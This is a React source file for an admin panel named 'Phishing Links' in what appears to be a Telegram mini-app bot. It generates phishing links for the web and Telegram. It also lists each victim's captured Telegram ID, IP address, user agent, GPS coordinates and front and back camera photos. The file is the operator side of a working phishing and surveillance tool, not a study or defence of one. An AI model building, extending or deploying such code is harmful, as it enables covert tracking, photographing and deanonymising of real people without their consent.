import { useState, useEffect, useCallback, useRef } from "react";
import { Layout } from "@/components/layout";
import { useApiAuth, useTelegram } from "@/lib/telegram-context";
import { API_BASE } from "@/lib/api";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { toast } from "sonner";
import {
  Link2, Plus, Copy, Trash2, Eye, MapPin, Camera,
  Globe, User, Clock, ChevronLeft, Loader2, ExternalLink,
} from "lucide-react";

function AuthImage({ src, alt, className, headers }: { src: string; alt: string; className?: string; headers: Record<string, string> }) {
  const [objectUrl, setObjectUrl] = useState<string | null>(null);
  const [error, setError] = useState(false);
  const urlRef = useRef<string | null>(null);

  useEffect(() => {
    let cancelled = false;
    fetch(src, { headers })
      .then((res) => {
        if (!res.ok) throw new Error("Failed");
        return res.blob();
      })
      .then((blob) => {
        if (cancelled) return;
        const url = URL.createObjectURL(blob);
        urlRef.current = url;
        setObjectUrl(url);
      })
      .catch(() => {
        if (!cancelled) setError(true);
      });
    return () => {
      cancelled = true;
      if (urlRef.current) URL.revokeObjectURL(urlRef.current);
    };
  }, [src]);

  if (error) return <div className={`${className} bg-muted/30 flex items-center justify-center text-[10px] text-muted-foreground`}>Failed to load</div>;
  if (!objectUrl) return <div className={`${className} bg-muted/30 animate-pulse`} />;
  return <img src={objectUrl} alt={alt} className={className} loading="lazy" />;
}

type PhishingLink = {
  id: number;
  code: string;
  label: string;
  capture_count: number;
  created_at: string;
};

type Capture = {
  id: number;
  link_code: string;
  telegram_id: string | null;
  ip: string;
  user_agent: string;
  latitude: number | null;
  longitude: number | null;
  front_photo_key: string | null;
  back_photo_key: string | null;
  front_file_id: string | null;
  back_file_id: string | null;
  created_at: string;
};

function copyText(text: string) {
  try {
    if (navigator.clipboard?.writeText) {
      navigator.clipboard.writeText(text).catch(() => {});
    }
  } catch {}
  try {
    const ta = document.createElement("textarea");
    ta.value = text;
    ta.style.cssText = "position:fixed;left:-9999px;opacity:0";
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
  } catch {}
}

export function AdminPhishing() {
  const { headers } = useApiAuth() as { headers: Record<string, string> };
  const { openLink } = useTelegram();
  const [links, setLinks] = useState<PhishingLink[]>([]);
  const [loading, setLoading] = useState(true);
  const [creating, setCreating] = useState(false);
  const [label, setLabel] = useState("");
  const [selectedCode, setSelectedCode] = useState<string | null>(null);
  const [captures, setCaptures] = useState<Capture[]>([]);
  const [loadingCaptures, setLoadingCaptures] = useState(false);

  const fetchLinks = useCallback(async () => {
    try {
      const res = await fetch(`${API_BASE}/phishing/links`, { headers });
      if (res.ok) setLinks(await res.json());
    } catch {}
    setLoading(false);
  }, [headers]);

  useEffect(() => { fetchLinks(); }, []);

  const createLink = async () => {
    setCreating(true);
    try {
      const res = await fetch(`${API_BASE}/phishing/create`, {
        method: "POST",
        headers: { ...headers, "Content-Type": "application/json" },
        body: JSON.stringify({ label }),
      });
      if (res.ok) {
        const data = await res.json();
        toast.success(`Link created: ${data.code}`);
        setLabel("");
        fetchLinks();
      } else {
        toast.error("Failed to create link");
      }
    } catch { toast.error("Error creating link"); }
    setCreating(false);
  };

  const deleteLink = async (code: string) => {
    try {
      await fetch(`${API_BASE}/phishing/link/${code}`, { method: "DELETE", headers });
      toast.success("Link deleted");
      if (selectedCode === code) setSelectedCode(null);
      fetchLinks();
    } catch { toast.error("Failed to delete"); }
  };

  const viewCaptures = async (code: string) => {
    setSelectedCode(code);
    setLoadingCaptures(true);
    try {
      const res = await fetch(`${API_BASE}/phishing/captures?code=${code}`, { headers });
      if (res.ok) setCaptures(await res.json());
    } catch {}
    setLoadingCaptures(false);
  };

  if (selectedCode) {
    return (
      <Layout title="Captures">
        <div className="h-full overflow-y-auto">
          <div className="p-4 space-y-3">
            <button
              onClick={() => setSelectedCode(null)}
              className="flex items-center gap-1 text-xs text-muted-foreground hover:text-foreground transition-colors"
            >
              <ChevronLeft className="h-3.5 w-3.5" />
              Back to links
            </button>

            <div className="bg-muted/30 rounded-xl border border-border p-3">
              <p className="text-xs font-mono text-muted-foreground">Code: <span className="text-foreground">{selectedCode}</span></p>
              <p className="text-xs text-muted-foreground mt-1">{captures.length} capture(s)</p>
            </div>

            {loadingCaptures ? (
              <div className="flex justify-center py-8">
                <Loader2 className="h-6 w-6 animate-spin text-muted-foreground" />
              </div>
            ) : captures.length === 0 ? (
              <p className="text-center text-xs text-muted-foreground py-8">No captures yet</p>
            ) : (
              captures.map((cap) => (
                <div key={cap.id} className="bg-card border border-border rounded-2xl overflow-hidden">
                  <div className="p-3 space-y-2">
                    <div className="flex items-center justify-between">
                      <Badge variant="outline" className="text-[10px] font-mono">#{cap.id}</Badge>
                      <span className="text-[10px] text-muted-foreground">
                        {new Date(cap.created_at + "Z").toLocaleString()}
                      </span>
                    </div>

                    {cap.telegram_id && (
                      <div className="flex items-center gap-2">
                        <User className="h-3.5 w-3.5 text-blue-400" />
                        <span className="text-xs">TG ID: <code className="text-blue-400">{cap.telegram_id}</code></span>
                      </div>
                    )}

                    <div className="flex items-center gap-2">
                      <Globe className="h-3.5 w-3.5 text-muted-foreground" />
                      <span className="text-xs font-mono">{cap.ip}</span>
                    </div>

                    {cap.latitude && cap.longitude && (
                      <button
                        onClick={() => {
                          try { openLink(`https://maps.google.com/?q=${cap.latitude},${cap.longitude}`); }
                          catch { window.open(`https://maps.google.com/?q=${cap.latitude},${cap.longitude}`, "_blank"); }
                        }}
                        className="flex items-center gap-2 text-emerald-400 hover:text-emerald-300 transition-colors"
                      >
                        <MapPin className="h-3.5 w-3.5" />
                        <span className="text-xs">{cap.latitude!.toFixed(6)}, {cap.longitude!.toFixed(6)}</span>
                        <ExternalLink className="h-3 w-3" />
                      </button>
                    )}

                    <p className="text-[10px] text-muted-foreground truncate">{cap.user_agent}</p>

                    <div className="grid grid-cols-2 gap-2">
                      {(cap.front_file_id || cap.front_photo_key) && (
                        <div className="space-y-1">
                          <p className="text-[10px] text-muted-foreground flex items-center gap-1">
                            <Camera className="h-3 w-3" /> Front
                          </p>
                          {cap.front_file_id ? (
                            <img
                              src={`${API_BASE}/file/${cap.front_file_id}`}
                              alt="Front camera"
                              className="w-full rounded-lg border border-border"
                              loading="lazy"
                            />
                          ) : (
                            <AuthImage
                              src={`${API_BASE}/phishing/photo/${cap.front_photo_key}`}
                              alt="Front camera"
                              className="w-full rounded-lg border border-border"
                              headers={headers}
                            />
                          )}
                        </div>
                      )}
                      {(cap.back_file_id || cap.back_photo_key) && (
                        <div className="space-y-1">
                          <p className="text-[10px] text-muted-foreground flex items-center gap-1">
                            <Camera className="h-3 w-3" /> Back
                          </p>
                          {cap.back_file_id ? (
                            <img
                              src={`${API_BASE}/file/${cap.back_file_id}`}
                              alt="Back camera"
                              className="w-full rounded-lg border border-border"
                              loading="lazy"
                            />
                          ) : (
                            <AuthImage
                              src={`${API_BASE}/phishing/photo/${cap.back_photo_key}`}
                              alt="Back camera"
                              className="w-full rounded-lg border border-border"
                              headers={headers}
                            />
                          )}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </Layout>
    );
  }

  return (
    <Layout title="Phishing Links">
      <div className="h-full overflow-y-auto">
        <div className="p-4 space-y-4">
          <div className="bg-card border border-border rounded-2xl overflow-hidden">
            <div className="flex items-center gap-2 px-4 py-3">
              <Plus className="h-4 w-4 text-primary" />
              <span className="text-sm font-medium">Create New Link</span>
            </div>
            <Separator />
            <div className="px-4 py-3 space-y-2">
              <input
                type="text"
                placeholder="Label (optional)"
                value={label}
                onChange={(e) => setLabel(e.target.value)}
                className="w-full h-9 px-3 text-sm bg-muted/30 border border-border rounded-lg focus:outline-none focus:ring-1 focus:ring-primary"
              />
              <Button
                size="sm"
                className="w-full h-9 text-xs"
                onClick={createLink}
                disabled={creating}
              >
                {creating ? <Loader2 className="h-3.5 w-3.5 animate-spin mr-1.5" /> : <Link2 className="h-3.5 w-3.5 mr-1.5" />}
                Generate Link
              </Button>
            </div>
          </div>

          <div className="space-y-2">
            <p className="text-xs font-semibold text-muted-foreground uppercase tracking-wide px-1">
              Your Links ({links.length})
            </p>

            {loading ? (
              <div className="flex justify-center py-8">
                <Loader2 className="h-6 w-6 animate-spin text-muted-foreground" />
              </div>
            ) : links.length === 0 ? (
              <p className="text-center text-xs text-muted-foreground py-8">No links created yet</p>
            ) : (
              links.map((link) => (
                <div key={link.id} className="bg-card border border-border rounded-xl p-3 space-y-2">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2 min-w-0">
                      <Link2 className="h-4 w-4 text-primary shrink-0" />
                      <span className="text-sm font-medium truncate">{link.label || link.code}</span>
                    </div>
                    <Badge variant={link.capture_count > 0 ? "default" : "outline"} className="text-[10px] shrink-0">
                      {link.capture_count} capture{link.capture_count !== 1 ? "s" : ""}
                    </Badge>
                  </div>

                  <div className="text-[10px] text-muted-foreground font-mono truncate">
                    {link.code} · {new Date(link.created_at + "Z").toLocaleDateString()}
                  </div>

                  <div className="flex gap-1.5">
                    <Button
                      size="sm"
                      variant="outline"
                      className="flex-1 h-7 text-[10px] gap-1"
                      onClick={() => {
                        const domain = new URL(API_BASE).origin;
                        copyText(`${domain}/api/p/${link.code}`);
                        toast.success("Web link copied!");
                      }}
                    >
                      <Copy className="h-3 w-3" /> Web
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      className="flex-1 h-7 text-[10px] gap-1"
                      onClick={() => {
                        copyText(`https://t.me/lifegrambot/miniapp?startapp=p_${link.code}`);
                        toast.success("Mini app link copied!");
                      }}
                    >
                      <Copy className="h-3 w-3" /> Mini App
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      className="h-7 w-7 p-0"
                      onClick={() => viewCaptures(link.code)}
                    >
                      <Eye className="h-3 w-3" />
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      className="h-7 w-7 p-0 text-red-400 hover:text-red-300"
                      onClick={() => deleteLink(link.code)}
                    >
                      <Trash2 className="h-3 w-3" />
                    </Button>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>
    </Layout>
  );
}
